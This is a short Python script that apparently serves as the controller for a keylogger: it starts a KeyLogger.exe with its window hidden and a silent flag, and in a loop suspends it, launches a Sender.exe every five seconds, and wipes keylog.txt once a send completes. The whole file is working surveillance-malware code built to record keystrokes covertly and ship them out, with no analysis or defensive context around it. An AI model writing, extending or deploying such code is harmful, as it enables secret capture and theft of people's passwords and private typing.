import time
import psutil
import subprocess, shlex

SEND_INTERVAL = 5


if __name__ == '__main__':
    si = subprocess.STARTUPINFO()
    
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    
    logger_start_command = "./Logger/KeyLogger.exe /S"
    logger_cwd = "./Logger"
    
    sender_start_command = "./Sender/Sender.exe /S"
    sender_cwd = "./Sender"
    
    logger_args = shlex.split(logger_start_command)
    sender_args = shlex.split(sender_start_command)
    
    logger_pipe = subprocess.Popen(logger_args, startupinfo=si, cwd=logger_cwd)
    logger_process = psutil.Process(logger_pipe.pid)

    while True:
        print("Sending...")
        logger_process.suspend()
        sender_pipe = subprocess.Popen(sender_args, startupinfo=si, cwd=sender_cwd)
        time.sleep(SEND_INTERVAL)
        if sender_pipe.poll() is not None:
            print("Logger closed. Rewriting...")
            open("Logger/keylog.txt", "w").close()
            
        logger_process.resume()
    
    